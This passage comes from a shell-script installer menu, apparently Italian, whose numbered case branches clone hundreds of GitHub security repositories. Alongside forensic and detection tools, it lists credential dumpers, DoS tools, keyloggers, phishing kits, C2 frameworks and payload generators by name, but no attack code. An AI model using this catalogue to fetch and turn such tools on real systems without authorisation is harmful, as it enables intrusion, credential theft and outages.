		Clona "leviathan-framework/leviathan"
	;;
	"1429")
		Clona "galkan/levye"
	;;
	"1430")
		Clona "OsandaMalith/LFiFreak"
	;;
	"1431")
		Clona "aepereyra/lfimap"
	;;
	"1432")
		Clona "D35m0nd142/LFISuite"
	;;
	"1433")
		Clona "williballenthin/LfLe"
	;;
	"1434")
		Clona "blindfuzzy/LHF"
	;;
	"1435")
		Clona "libyal/libbde"
	;;
	"1436")
		Clona "niklasb/libc-database"
	;;
	"1437")
		Clona "libyal/libfvde"
	;;
	"1438")
		Clona "libparistraceroute/libparistraceroute"
	;;
	"1439")
		Clona "mfontanini/libtins"
	;;
	"1440")
		Clona "mzfr/liffy"
	;;
	"1441")
		Clona "lightbulb-framework/lightbulb-framework"
	;;
	"1442")
		Clona "kd8bny/LiMEaide"
	;;
	"1443")
		Clona "rebootuser/LinEnum"
	;;
	"1444")
		Clona "portcullislabs/linikatz"
	;;
	"1445")
		Clona "initstring/linkedin2username"
	;;
	"1446")
		Clona "GerbenJavado/LinkFinder"
	;;
	"1447")
		Clona "vk496/linset"
	;;
	"1448")
		Clona "PenturaLabs/Linux_Exploit_Suggester"
	;;
	"1449")
		Clona "mzet-/linux-exploit-suggester"
	;;
	"1450")
		Clona "gaffe23/linux-inject"
	;;
	"1451")
		Clona "diego-treitos/linux-smart-enumeration"
	;;
	"1452")
		Clona "ant4g0nist/lisa.py"
	;;
	"1453")
		Clona "lulz3xploit/LittleBrother"
	;;
	"1454")
		Clona "taviso/loadlibrary"
	;;
	"1455")
		Clona "lightfaith/locasploit"
	;;
	"1456")
		Clona "jschicht/LogFileParser"
	;;
	"1457")
		Clona "kernc/logkeys"
	;;
	"1458")
		Clona "NewEraCracker/LOIC"
	;;
	"1459")
		Clona "Neo23x0/Loki"
	;;
	"1460")
		Clona "api0cradle/LOLBAS"
	;;
	"1461")
		Clona "GuerrillaWarfare/Loot"
	;;
	"1462")
		Clona "kismetwireless/lorcon"
	;;
	"1463")
		Clona "jensvoid/lorg"
	;;
	"1464")
		Clona "Evrytania/LTE-Cell-Scanner"
	;;
	"1465")
		Clona "lateralblast/lunar"
	;;
	"1466")
		Clona "deathmarine/Luyten"
	;;
	"1467")
		Clona "initstring/lyricpass"
	;;
	"1468")
		Clona "infosecn1nja/MaliciousMacroMSBuild"
	;;
	"1469")
		Clona "HurricaneLabs/machinae"
	;;
	"1470")
		Clona "paraxor/maclookup"
	;;
	"1471")
		Clona "steverobbins/magescan"
	;;
	"1472")
		Clona "GoSecure/malboxes"
	;;
	"1473")
		Clona "tomchop/malcom"
	;;
	"1474")
		Clona "maliceio/malice"
	;;
	"1475")
		Clona "justmao945/mallory"
	;;
	"1476")
		Clona "Ice3man543/MalScan"
	;;
	"1477")
		Clona "stamparm/maltrail"
	;;
	"1478")
		Clona "technoskald/maltrieve"
	;;
	"1479")
		Clona "sensepost/mana"
	;;
	"1480")
		Clona "z0noxz/mando.me"
	;;
	"1481")
		Clona "trailofbits/manticore"
	;;
	"1482")
		Clona "ApertureLabsLtd/marc4dasm"
	;;
	"1483")
		Clona "saeeddhqan/Maryam"
	;;
	"1484")
		Clona "1N3/Sn1per"
	;;
	"1485")
		Clona "robertdavidgraham/masscan"
	;;
	"1486")
		Clona "trevordavenport/MasscanAutomation"
	;;
	"1487")
		Clona "blechschmidt/massdns"
	;;
	"1488")
		Clona "jm33-m0/mec"
	;;
	"1489")
		Clona "fgrimme/Matroschka"
	;;
	"1490")
		Clona "evanmiller/mdbtools"
	;;
	"1491")
		Clona "aircrack-ng/mdk4"
	;;
	"1492")
		Clona "chadillac/mdns_recon"
	;;
	"1493")
		Clona "platomav/MEAnalyzer"
	;;
	"1494")
		Clona "tomnomnom/meg"
	;;
	"1495")
		Clona "sc0tfree/mentalist"
	;;
	"1496")
		Clona "Ne0nd0g/merlin"
	;;
	"1497")
		Clona "j3ssie/metabigor"
	;;
	"1498")
		Clona "a0rtega/metame"
	;;
	"1499")
		Clona "hahwul/metasploit-autopwn"
	;;
	"1500")
		Clona "jschicht/Mft2Csv"
	;;
	"1501")
		Clona "jschicht/MftCarver"
	;;
	"1502")
		Clona "jschicht/MftRcrd"
	;;
	"1503")
		Clona "jschicht/MftRef2Name"
	;;
	"1504")
		Clona "screetsec/Microsploit"
	;;
	"1505")
		Clona "kost/mikrotik-npk"
	;;
	"1506")
		Clona "daehee/mildew"
	;;
	"1507")
		Clona "gentilkiwi/mimikatz"
	;;
	"1508")
		Clona "huntergregal/mimipenguin"
	;;
	"1509")
		Clona "kamalmostafa/minimodem"
	;;
	"1510")
		Clona "blackeko/mitm"
	;;
	"1511")
		Clona "jrmdev/mitm_relay"
	;;
	"1512")
		Clona "dirkjanm/mitm6"
	;;
	"1513")
		Clona "xdavidhu/mitmAP"
	;;
	"1514")
		Clona "husam212/MITMer"
	;;
	"1515")
		Clona "byt3bl33d3r/MITMf"
	;;
	"1516")
		Clona "fox-it/mkYARA"
	;;
	"1517")
		Clona "arkime/arkime"
	;;
	"1518")
		Clona "stampery/mongoaudit"
	;;
	"1519")
		Clona "RedTeamPentesting/monsoon"
	;;
	"1520")
		Clona "vortexau/mooscan"
	;;
	"1521")
		Clona "r00txp10it/morpheus"
	;;
	"1522")
		Clona "CoolerVoid/Mosca"
	;;
	"1523")
		Clona "koto/mosquito"
	;;
	"1524")
		Clona "kevinkoo001/MotS"
	;;
	"1525")
		Clona "waytoalpit/ManOnTheSideAttack-DNS-Spoofing"
	;;
	"1526")
		Clona "iamckn/mousejack_transmit"
	;;
	"1527")
		Clona "CiscoCXSecurity/mptcp-abuse"
	;;
	"1528")
		Clona "meliht/mr.sip"
	;;
	"1529")
		Clona "t2mune/mrtparse"
	;;
	"1530")
		Clona "g0tmi1k/mpc"
	;;
	"1531")
		Clona "BlackArch/msfdb"
	;;
	"1532")
		Clona "wez3/msfenum"
	;;
	"1533")
		Clona "kkonradpl/mtscan"
	;;
	"1534")
		Clona "EliasOenal/multimon-ng"
	;;
	"1535")
		Clona "mitre/multiscanner"
	;;
	"1536")
		Clona "covertcodes/multitun"
	;;
	"1537")
		Clona "Neo23x0/munin"
	;;
	"1538")
		Clona "muraenateam/muraena"
	;;
	"1539")
		Clona "falcon-lnhg/mwebfp"
	;;
	"1540")
		Clona "rek7/mXtract"
	;;
	"1541")
		Clona "rapid7/myBFF"
	;;
	"1542")
		Clona "mBouamama/MyJWT"
	;;
	"1543")
		Clona "mehrdadrad/mylg"
	;;
	"1544")
		Scarica "https://gist.githubusercontent.com/esperlu/943776/raw/be469f0a0ab8962350f3c5ebe8459218b915f817/mysql2sqlite.sh"
	;;
	"1545")
		Clona "FSecureLABS/N1QLMap"
	;;
	"1546")
		Clona "carmaa/nacker"
	;;
	"1547")
		Clona "tcstool/nasnum"
	;;
	"1548")
		Clona "resurrecting-open-source-projects/nbtscan"
	;;
	"1549")
		Clona "PentesterES/Necromant"
	;;
	"1550")
		Clona "mwrlabs/needle"
	;;
	"1551")
		Clona "GuerrillaWarfare/neglected"
	;;
	"1552")
		Clona "PherricOxide/Neighbor-Cache-Fingerprinter"
	;;
	"1553")
		Clona "troglobit/nemesis"
	;;
	"1554")
		Clona "L-codes/Neo-reGeorg"
	;;
	"1555")
		Clona "DanMcInerney/net-creds"
	;;
	"1556")
		Clona "chrizator/netattack2"
	;;
	"1557")
		Clona "evilsocket/netcommander"
	;;
	"1558")
		Clona "NytroRST/NetRipper"
	;;
	"1559")
		Clona "walchko/netscan2"
	;;
	"1560")
		Clona "PherricOxide/Network-App-Stress-Tester"
	;;
	"1561")
		Clona "lorenzog/NetworkMap"
	;;
	"1562")
		Clona "hdm/nextnet"
	;;
	"1563")
		Clona "bonsaiviking/NfSpy"
	;;
	"1564")
		Clona "jpr5/ngrep"
	;;
	"1565")
		Clona "niloofarkheirkhah/nili"
	;;
	"1566")
		Clona "andresriancho/nimbostratus"
	;;
	"1567")
		Clona "GouveaHeitor/nipe"
	;;
	"1568")
		Clona "hahwul/nmap-parse-output"
	;;
	"1569")
		Clona "flipchan/Nohidy"
	;;
	"1570")
		Clona "hiddenillusion/NoMoreXOR"
	;;
	"1571")
		Clona "Rurik/Noriben"
	;;
	"1572")
		Clona "Charlie-belmer/nosqli"
	;;
	"1573")
		Clona "an0nlk/Nosql-MongoDB-injection-username-password-enumeration"
	;;
	"1574")
		Clona "tcstool/NoSQLMap"
	;;
	"1575")
		Clona "chrisallenlane/novahot"
	;;
	"1576")
		Clona "nray-scanner/nray"
	;;
	"1577")
		Clona "JKO/nsearch"
	;;
	"1578")
		Clona "anonion0/nsec3map"
	;;
	"1579")
		Clona "jonasdn/nsntrace"
	;;
	"1580")
		Clona "csababarta/ntdsxtract"
	;;
	"1581")
		Clona "jschicht/NtfsFileExtractor"
	;;
	"1582")
		Clona "b17zr/ntlm_challenger"
	;;
	"1583")
		Clona "preempt/ntlm-scanner"
	;;
	"1584")
		Clona "sachinkamath/ntlmrecon"
	;;
	"1585")
		Clona "sepehrdaddev/ntpdos"
	;;
	"1586")
		Clona "projectdiscovery/nuclei-templates"
	;;
	"1587")
		Clona "m8r0wn/nullinux"
	;;
	"1588")
		Clona "Hadi999/NXcrypt"
	;;
	"1589")
		Clona "blackarch-cracker|BL4CKvGHOST/Ob3vil1on"
	;;
	"1590")
		Clona "wetw0rk/objdump2shellcode"
	;;
	"1591")
		Clona "0xdeadbeefJERKY/Office-DDE-Payloads"
	;;
	"1592")
		Clona "amlight/ofp_sniffer"
	;;
	"1593")
		Clona "mIcHyAmRaNe/okadminfinder3"
	;;
	"1594")
		Clona "RUB-SysSec/OMEN"
	;;
	"1595")
		Clona "InQuest/omnibus"
	;;
	"1596")
		Clona "Miserlou/omnihash"
	;;
	"1597")
		Clona "D4Vinci/One-Lin3r"
	;;
	"1598")
		Clona "superkojiman/onetwopunch"
	;;
	"1599")
		Clona "k4m4/onioff"
	;;
	"1600")
		Clona "s-rah/onionscan"
	;;
	"1601")
		Clona "megadose/OnionSearch"
	;;
	"1602")
		Clona "micahflee/onionshare"
	;;
	"1603")
		Clona "stanislav-web/OpenDoor"
	;;
	"1604")
		Clona "regit/opensvp"
	;;
	"1605")
		Clona "greenbone/openvas"
	;;
	"1606")
		Clona "graniet/operative-framework"
	;;
	"1607")
		Clona "gdelugre/origami"
	;;
	"1608")
		Clona "orjail/orjail"
	;;
	"1609")
		Clona "segofensiva/OSfooler-ng"
	;;
	"1610")
		Clona "th3unkn0n/osi.ig"
	;;
	"1611")
		Clona "SharadKumar97/OSINT-SPY"
	;;
	"1612")
		Clona "guitarmanj/OSINTerator"
	;;
	"1613")
		Clona "pstavirs/ostinato"
	;;
	"1614")
		Clona "lijiejie/OutLook_WebAPP_Brute"
	;;
	"1615")
		Clona "depasonico/OWASP-ByWaf"
	;;
	"1616")
		Clona "zscproject/OWASP-ZSC"
	;;
	"1617")
		Clona "hashicorp/packer"
	;;
	"1618")
		Clona "DNS-OARC/PacketQ"
	;;
	"1619")
		Clona "dannagle/PacketSender"
	;;
	"1620")
		Clona "RhinoSecurityLabs/pacu"
	;;
	"1621")
		Clona "bniemczyk/pacumen"
	;;
	"1622")
		Clona "Dionach/PANhunt"
	;;
	"1623")
		Clona "lightos/Panoptic"
	;;
	"1624")
		Clona "roglew/pappy-proxy"
	;;
	"1625")
		Clona "mak-/parameth"
	;;
	"1626")
		Clona "Bo0oM/ParamPamPam"
	;;
	"1627")
		Clona "KasperskyLab/ForensicsTools"
	;;
	"1628")
		Clona "behindthefirewalls/Parsero"
	;;
	"1629")
		Clona "jensp/passcracking"
	;;
	"1630")
		Clona "Dionach/PassHunt"
	;;
	"1631")
		Clona "gamelinux/passivedns"
	;;
	"1632")
		Clona "D4Vinci/PasteJacker"
	;;
	"1633")
		Clona "isaudits/pasv-agrsv"
	;;
	"1634")
		Clona "lunixbochs/patchkit"
	;;
	"1635")
		Clona "ShotokanZH/Pa-th-zuzu"
	;;
	"1636")
		Clona "CoolerVoid/payloadmask"
	;;
	"1637")
		Clona "swisskyrepo/PayloadsAllTheThings"
	;;
	"1638")
		Clona "gvb84/pbscan"
	;;
	"1639")
		Clona "vikwin/pcapfex"
	;;
	"1640")
		Clona "Srinivas11789/PcapXray"
	;;
	"1641")
		Clona "ufrisk/pcileech"
	;;
	"1642")
		Clona "Big5-sec/pcode2code"
	;;
	"1643")
		Clona "lgandx/PCredz"
	;;
	"1644")
		Clona "SecurityRiskAdvisors/PDBlaster"
	;;
	"1645")
		Clona "c0decave/pdfgrab"
	;;
	"1646")
		Clona "gdelugre/pdfwalker"
	;;
	"1647")
		Clona "hasherezade/pe-bear"
	;;
	"1648")
		Clona "hasherezade/pe-sieve"
	;;
	"1649")
		Clona "Caleb1994/peach"
	;;
	"1650")
		Clona "carlospolop/privilege-escalation-awesome-scripts-suite"
	;;
	"1651")
		Clona "longld/peda"
	;;
	"1652")
		Clona "guelfoweb/peframe"
	;;
	"1653")
		Clona "robertdavidgraham/pemcrack"
	;;
	"1654")
		Clona "bwall/pemcracker"
	;;
	"1655")
		Clona "praetorian-inc/pentestly"
	;;
	"1656")
		Clona "GinjaChris/pentmenu"
	;;
	"1657")
		Clona "woj-ciech/pepe"
	;;
	"1658")
		Clona "Th3Hurrican3/PEpper"
	;;
	"1659")
		Clona "petoolse/petools"
	;;
	"1660")
		Clona "facebook/pfff"
	;;
	"1661")
		Clona "idiom/pftriage"
	;;
	"1662")
		Clona "kstrauser/pgdbf"
	;;
	"1663")
		Clona "nccgroup/phantap"
	;;
	"1664")
		Clona "oddcod3/Phantom-Evasion"
	;;
	"1665")
		Clona "Dionach/PhEmail"
	;;
	"1666")
		Clona "ryhanson/phishery"
	;;
	"1667")
		Clona "t4d/PhishingKitHunter"
	;;
	"1668")
		Clona "entynetproject/phonia"
	;;
	"1669")
		Clona "s0md3v/Photon"
	;;
	"1670")
		Clona "pentestmonkey/php-findsock-shell"
	;;
	"1671")
		Clona "bwall/PHP-RFI-Payload-Decoder"
	;;
	"1672")
		Clona "phpstan/phpstan"
	;;
	"1673")
		Clona "nightlionsecurity/phpstress"
	;;
	"1674")
		Clona "WiPi-Hunter/PiDense"
	;;
	"1675")
		Clona "wagiro/pintool"
	;;
	"1676")
		Clona "sebastiendamaye/pintool2"
	;;
	"1677")
		Clona "nccgroup/pip3line"
	;;
	"1678")
		Clona "hirnschallsebastian/Pipeline2"
	;;
	"1679")
		Clona "RedTeamOperations/PivotSuite"
	;;
	"1680")
		Clona "FireyFly/pixd"
	;;
	"1681")
		Clona "wiire/pixiewps"
	;;
	"1682")
		Clona "caesar0301/pkt2flow"
	;;
	"1683")
		Clona "joelpx/plasma"
	;;
	"1684")
		Clona "iniqua/plecost"
	;;
	"1685")
		Clona "unweb/plown"
	;;
	"1686")
		Clona "cybereason/linux_plumber"
	;;
	"1687")
		Clona "pmacct/pmacct"
	;;
	"1688")
		Clona "nccgroup/PMapper"
	;;
	"1689")
		Clona "knownsec/Pocsuite"
	;;
	"1690")
		Clona "grCod/poly"
	;;
	"1691")
		Clona "polyswarm/polyswarm-api"
	;;
	"1692")
		Clona "rfunix/Pompem"
	;;
	"1693")
		Clona "iagox86/poracle"
	;;
	"1694")
		Clona "SpiderLabs/portia"
	;;
	"1695")
		Clona "mbahadou/postenum"
	;;
	"1696")
		Clona "mantvydasb/Invoke-PowerCloud"
	;;
	"1697")
		Clona "Mr-Un1k0d3r/PowerLessShell"
	;;
	"1698")
		Clona "jschicht/PowerMft"
	;;
	"1699")
		Clona "fdiskyou/PowerOPS"
	;;
	"1700")
		Clona "p3nt4/PowerShdll"
	;;
	"1701")
		Clona "mattifestation/PowerSploit"
	;;
	"1702")
		Clona "z0noxz/powerstager"
	;;
	"1703")
		Clona "pownjs/pown"
	;;
	"1704")
		Clona "n1nj4sec/pr0cks"
	;;
	"1705")
		Clona "percx/Praeda"
	;;
	"1706")
		Clona "zardus/preeny"
	;;
	"1707")
		Clona "jsteube/princeprocessor"
	;;
	"1708")
		Clona "Microsoft/ProcDump-for-Linux"
	;;
	"1709")
		Clona "daniel-araujo/proctal"
	;;
	"1710")
		Clona "averagesecurityguy/prometheus"
	;;
	"1711")
		Clona "alfresco/prowler"
	;;
	"1712")
		Clona "hugsy/proxenet"
	;;
	"1713")
		Clona "projectdiscovery/proxify"
	;;
	"1714")
		Clona "Proxmark/proxmark3"
	;;
	"1715")
		Clona "rofl0r/proxychains"
	;;
	"1716")
		Clona "CroweCybersecurity/ps1encode"
	;;
	"1717")
		Clona "regit/pshitt"
	;;
	"1718")
		Clona "DominicBreuker/pspy"
	;;
	"1719")
		Clona "trustedsec/ptf"
	;;
	"1720")
		Clona "byt3bl33d3r/pth-toolkit"
	;;
	"1721")
		Clona "shirkdog/pulledpork"
	;;
	"1722")
		Clona "nethunteros/punter"
	;;
	"1723")
		Clona "n1nj4sec/pupy"
	;;
	"1724")
		Clona "cr4shcod3/pureblood"
	;;
	"1725")
		Clona "tch1001/pwdlogy"
	;;
	"1726")
		Clona "ins1gn1a/pwdlyser"
	;;
	"1727")
		Clona "pwndbg/pwndbg"
	;;
	"1728")
		Clona "kgretzky/pwndrop"
	;;
	"1729")
		Clona "wKovacs64/pwned"
	;;
	"1730")
		Clona "mikepound/pwned-search"
	;;
	"1731")
		Clona "thewhiteh4t/pwnedOrNot"
	;;
	"1732")
		Clona "h0ussni/pwnloris"
	;;
	"1733")
		Clona "Gallopsled/pwntools"
	;;
	"1734")
		Clona "ikkebr/PyBozoCrack"
	;;
	"1735")
		Clona "nottinghamprisateam/pyersinia"
	;;
	"1736")
		Clona "ytisf/PyExfil"
	;;
	"1737")
		Clona "fgeek/pyfiscan"
	;;
	"1738")
		Clona "bidord/pykek"
	;;
	"1739")
		Clona "m8r0wn/pymeta"
	;;
	"1740")
		Clona "GoSecure/pyrdp"
	;;
	"1741")
		Clona "moheshmohan/pyssltest"
	;;
	"1742")
		Clona "m4n3dw0lf/PytheM"
	;;
	"1743")
		Clona "PaulSec/API-dnsdumpster.com"
	;;
	"1744")
		Clona "HDE/arsenic"
	;;
	"1745")
		Clona "beautify-web/js-beautify"
	;;
	"1746")
		Clona "GiacomoLaw/Keylogger"
	;;
	"1747")
		Clona "egaus/MaliciousMacroBot"
	;;
	"1748")
		Clona "rocky/python-uncompyle6"
	;;
	"1749")
		Clona "rednaga/yara-python"
	;;
	"1750")
		Clona "PaulSec/API-dnsdumpster.com"
	;;
	"1751")
		Clona "aquynh/capstone"
	;;
	"1752")
		Clona "asciimoo/exrex"
	;;
	"1753")
		Clona "rep/hpfeeds"
	;;
	"1754")
		Clona "beautify-web/js-beautify"
	;;
	"1755")
		Clona "skelsec/minidump"
	;;
	"1756")
		Clona "skelsec/minikerberos"
	;;
	"1757")
		Clona "VirusTotal/yara-python"
	;;
	"1758")
		Clona "linkedin/qark"
	;;
	"1759")
		Clona "h0nus/QRGen"
	;;
	"1760")
		Clona "OWASP/QRLJacking/tree/master/QRLJacker"
	;;
	"1761")
		Clona "quark-engine/quark-engine"
	;;
	"1762")
		Clona "tylabs/quicksand_lite"
	;;
	"1763")
		Clona "radareorg/cutter"
	;;
	"1764")
		Clona "radare/radare2-extras/tree/master/unicorn"
	;;
	"1765")
		Clona "radare/radare2-extras/tree/master/unicorn"
	;;
	"1766")
		Clona "funkandwagnalls/ranger"
	;;
	"1767")
		Clona "andrew-d/rough-auditing-tool-for-security"
	;;
	"1768")
		Clona "0x09AL/raven"
	;;
	"1769")
		Clona "mBouamama/rawsec_cli"
	;;
	"1770")
		Clona "taviso/rbndr"
	;;
	"1771")
		Clona "jschicht/RcrdCarver"
	;;
	"1772")
		Clona "portcullislabs/rdp-sec-check"
	;;
	"1773")
		Clona "t6x/reaver-wps-fork-t6x"
	;;
	"1774")
		Clona "Col-E/Recaf"
	;;
	"1775")
		Clona "prolsen/recentfilecache-parser"
	;;
	"1776")
		Clona "secretsquirrel/recomposer"
	;;
	"1777")
		Clona "codingo/Reconnoitre"
	;;
	"1778")
		Clona "RoliSoft/ReconScan"
	;;
	"1779")
		Clona "radenvodka/Recsech"
	;;
	"1780")
		Clona "Lazza/RecuperaBit"
	;;
	"1781")
		Clona "Tuhinshubhra/RED_HAWK"
	;;
	"1782")
		Clona "digitalbond/Redpoint3"
	;;
	"1783")
		Clona "darkk/redsocks"
	;;
	"1784")
		Clona "fireeye/ReelPhish"
	;;
	"1785")
		Clona "sensepost/reGeorg"
	;;
	"1786")
		Clona "mkorman90/regipy"
	;;
	"1787")
		Clona "google/rekall"
	;;
	"1788")
		Clona "KeepWannabe/Remot3d"
	;;
	"1789")
		Clona "microsoft/restler-fuzzer"
	;;
	"1790")
		Clona "lolwaleet/ReverseIP"
	;;
	"1791")
		Clona "PypeRanger/revipd"
	;;
	"1792")
		Clona "emptymonkey/revsh"
	;;
	"1793")
		Clona "shellphish/rex"
	;;
	"1794")
		Clona "j91321/rext"
	;;
	"1795")
		Clona "utkusen/rhodiola"
	;;
	"1796")
		Clona "redtimmy/Richsploit"
	;;
	"1797")
		Clona "trustedsec/ridenum"
	;;
	"1798")
		Clona "skorov/ridrelay"
	;;
	"1799")
		Clona "abelcheung/rifiuti2"
	;;
	"1800")
		Clona "activecm/rita"
	;;
	"1801")
		Clona "graniet/riwifshell"
	;;
	"1802")
		Clona "Gifts/Rogue-MySql-Server"
	;;
	"1803")
		Clona "wifiphisher/roguehostapd"
	;;
	"1804")
		Clona "sashs/Ropper"
	;;
	"1805")
		Clona "inaz2/roputils"
	;;
	"1806")
		Clona "jh00nbr/Routerhunter.0"
	;;
	"1807")
		Clona "0vercl0k/rp"
	;;
	"1808")
		Clona "AdiKo/RPCSniffer"
	;;
	"1809")
		Clona "freakyclown/RPDscan"
	;;
	"1810")
		Clona "artkond/rpivot"
	;;
	"1811")
		Clona "mozilla/rr"
	;;
	"1812")
		Clona "ius/rsatool"
	;;
	"1813")
		Clona "panagiks/RSPET"
	;;
	"1814")
		Clona "leostat/rtfm"
	;;
	"1815")
		Clona "bemasher/rtlamr"
	;;
	"1816")
		Clona "csete/rtlizer"
	;;
	"1817")
		Clona "EarToEarOak/RTLSDR-Scanner"
	;;
	"1818")
		Clona "synacktiv/rulesfinder"
	;;
	"1819")
		Clona "decrypto-org/rupture"
	;;
	"1820")
		Clona "phra/rustbuster"
	;;
	"1821")
		Clona "gh2o/rvi_capture"
	;;
	"1822")
		Clona "petermbenjamin/s3-fuzzer"
	;;
	"1823")
		Clona "sleinen/samplicator"
	;;
	"1824")
		Clona "jensp/samydeluxe"
	;;
	"1825")
		Clona "0xSearches/sandcastle"
	;;
	"1826")
		Clona "trimstray/sandmap"
	;;
	"1827")
		Clona "xoreaxeaxeax/sandsifter"
	;;
	"1828")
		Clona "donctl/sandy"
	;;
	"1829")
		Clona "elfmaster/saruman"
	;;
	"1830")
		Clona "Dman95/SASM"
	;;
	"1831")
		Clona "danilovazb/sawef"
	;;
	"1832")
		Clona "levi0x0/sb0x-project"
	;;
	"1833")
		Clona "t00sh/sc-make"
	;;
	"1834")
		Clona "vesche/scanless"
	;;
	"1835")
		Clona "scanmem/scanmem"
	;;
	"1836")
		Clona "kudelskisecurity/scannerl"
	;;
	"1837")
		Clona "bambish/ScanQLi"
	;;
	"1838")
		Clona "huntergregal/scansploit"
	;;
	"1839")
		Clona "rndinfosecguy/Scavenger"
	;;
	"1840")
		Clona "nccgroup/ScoutSuite"
	;;
	"1841")
		Clona "304GEEK/Scrape-DNS"
	;;
	"1842")
		Clona "pfalcon/ScratchABit"
	;;
	"1843")
		Clona "smythtech/sdnpwn"
	;;
	"1844")
		Clona "neuromancer/SEA"
	;;
	"1845")
		Clona "b3mb4m/Search1337"
	;;
	"1846")
		Clona "danielmiessler/SecLists"
	;;
	"1847")
		Clona "m4ll0k/SecretFinder"
	;;
	"1848")
		Clona "jschicht/Secure2Csv"
	;;
	"1849")
		Clona "galkan/sees"
	;;
	"1850")
		Clona "sensepost/xrdp"
	;;
	"1851")
		Clona "NickstaDB/SerialBrute"
	;;
	"1852")
		Clona "NickstaDB/SerializationDumper"
	;;
	"1853")
		Clona "mazen160/server-status_PWN"
	;;
	"1854")
		Clona "trustedsec/social-engineer-toolkit"
	;;
	"1855")
		Clona "EgeBalci/sgn"
	;;
	"1856")
		Clona "pavanw3b/sh00t"
	;;
	"1857")
		Clona "cr-marcstevens/sha1collisiondetection"
	;;
	"1858")
		Clona "philwantsfish/shard"
	;;
	"1859")
		Clona "CroweCybersecurity/shareenum"
	;;
	"1860")
		Clona "shirosaidev/sharesniffer"
	;;
	"1861")
		Clona "enkomio/shed"
	;;
	"1862")
		Clona "NytroRST/ShellcodeCompiler"
	;;
	"1863")
		Clona "danielhenrymantilla/shellcode-factory"
	;;
	"1864")
		Clona "merrychap/shellen"
	;;
	"1865")
		Clona "ShutdownRepo/shellerator"
	;;
	"1866")
		Clona "shellinabox/shellinabox"
	;;
	"1867")
		Clona "hatRiot/shellme"
	;;
	"1868")
		Clona "reyammer/shellnoob"
	;;
	"1869")
		Clona "0x00x00/ShellPop"
	;;
	"1870")
		Clona "b3mb4m/shellsploit-framework"
	;;
	"1871")
		Clona "sherlock-project/sherlock"
	;;
	"1872")
		Clona "elfmaster/sherlocked"
	;;
	"1873")
		Clona "eth0izzle/shhgit"
	;;
	"1874")
		Clona "acidvegas/shitflood"
	;;
	"1875")
		Clona "nccgroup/shocker"
	;;
	"1876")
		Clona "aploium/shootback"
	;;
	"1877")
		Clona "projectdiscovery/shuffledns"
	;;
	"1878")
		Clona "wetw0rk/Sickle"
	;;
	"1879")
		Clona "Neo23x0/sigma"
	;;
	"1880")
		Clona "appium/sign"
	;;
	"1881")
		Clona "SigPloiter/SigPloit"
	;;
	"1882")
		Clona "secretsquirrel/SigThief"
	;;
	"1883")
		Clona "achorein/silenteye"
	;;
	"1884")
		Clona "byt3bl33d3r/SILENTTRINITY"
	;;
	"1885")
		Clona "lunarca/SimpleEmailSpoofer"
	;;
	"1886")
		Clona "CalebFenton/simplify"
	;;
	"1887")
		Clona "killswitch-GUI/SimplyEmail"
	;;
	"1888")
		Clona "packetassailant/sipbrute"
	;;
	"1889")
		Clona "xenomuta/SIPffer"
	;;
	"1890")
		Clona "ST2Labs/SIPI"
	;;
	"1891")
		Clona "Pepelux/sippts"
	;;
	"1892")
		Clona "nils-ohlmeier/sipsak"
	;;
	"1893")
		Clona "zaf/sipshock"
	;;
	"1894")
		Clona "shenril/Sitadel"
	;;
	"1895")
		Clona "digininja/sitediff"
	;;
	"1896")
		Clona "h0ng10/sjet"
	;;
	"1897")
		Clona "84KaliPleXon3/skiptracer"
	;;
	"1898")
		Clona "cryptcoffee/skul"
	;;
	"1899")
		Clona "samyk/skyjack"
	;;
	"1900")
		Clona "emtunc/SlackPirate"
	;;
	"1901")
		Clona "RhinoSecurityLabs/SleuthQL"
	;;
	"1902")
		Clona "crytic/slither"
	;;
	"1903")
		Clona "shekyan/slowhttptest"
	;;
	"1904")
		Clona "gkbrk/slowloris"
	;;
	"1905")
		Clona "hehnope/slurp"
	;;
	"1906")
		Clona "JesusFreke/smali"
	;;
	"1907")
		Clona "ch0psticks/Smali-CFGs"
	;;
	"1908")
		Clona "dorneanu/smalisca"
	;;
	"1909")
		Clona "suraj-root/smap"
	;;
	"1910")
		Clona "georgiaw/Smartphone-Pentest-Framework"
	;;
	"1911")
		Clona "Raikia/SMBCrunch"
	;;
	"1912")
		Clona "pentestgeek/smbexec"
	;;
	"1913")
		Clona "smikims/arpspoof"
	;;
	"1914")
		Clona "enddo/smod"
	;;
	"1915")
		Clona "z0noxz/smplshllctrlr"
	;;
	"1916")
		Clona "isaudits/smtp-test"
	;;
	"1917")
		Clona "xFreed0m/SMTPTester"
	;;
	"1918")
		Clona "defparam/smuggler"
	;;
	"1919")
		Clona "gwen001/pentest-tools"
	;;
	"1920")
		Clona "1N3/Sn1per"
	;;
	"1921")
		Clona "hannob/snallygaster"
	;;
	"1922")
		Clona "thebradbain/snapception"
	;;
	"1923")
		Clona "mushorg/snare"
	;;
	"1924")
		Clona "purpleteam/snarf"
	;;
	"1925")
		Clona "SkypLabs/sniff-probe-req"
	;;
	"1926")
		Clona "julioreynaga/sniffer"
	;;
	"1927")
		Clona "kpcyrd/sniffglue"
	;;
	"1928")
		Clona "petabi/sniffles"
	;;
	"1929")
		Clona "SECFORCE/SNMP-Brute"
	;;
	"1930")
		Clona "m57/snoopbrute"
	;;
	"1931")
		Clona "sensepost/snoopy-ng"
	;;
	"1932")
		Clona "mauro-g/snuck"
	;;
	"1933")
		Clona "snyk/snyk"
	;;
	"1934")
		Clona "SpiderLabs/social_mapper"
	;;
	"1935")
		Clona "Betawolf/social-vuln-scanner"
	;;
	"1936")
		Clona "UndeadSec/SocialFish"
	;;
	"1937")
		Clona "iojw/socialscan"
	;;
	"1938")
		Clona "TheresAFewConors/Sooty"
	;;
	"1939")
		Clona "Ganapati/spaf"
	;;
	"1940")
		Clona "sensepost/SPartan"
	;;
	"1941")
		Clona "tatanus/SPF"
	;;
	"1942")
		Clona "BishopFox/spfmap"
	;;
	"1943")
		Scarica "$ENTRAW""phxbandit/scripts-and-tools/master/spiga.py"
	;;
	"1944")
		Clona "PaulSec/SPIPScan"
	;;
	"1945")
		Clona "BlackArch/sploitctl"
	;;
	"1946")
		Clona "bishopfox/spoofcheck"
	;;
	"1947")
		Clona "hlldz/SpookFlare"
	;;
	"1948")
		Clona "aas-n/spraykatz"
	;;
	"1949")
		Clona "zeropwn/spyse.py"
	;;
	"1950")
		Clona "Hadesy2k/sqlivulscan"
	;;
	"1951")
		Clona "jtesta/ssh-audit"
	;;
	"1952")
		Clona "droberson/ssh-honeypot"
	;;
	"1953")
		Clona "jtesta/ssh-mitm"
	;;
	"1954")
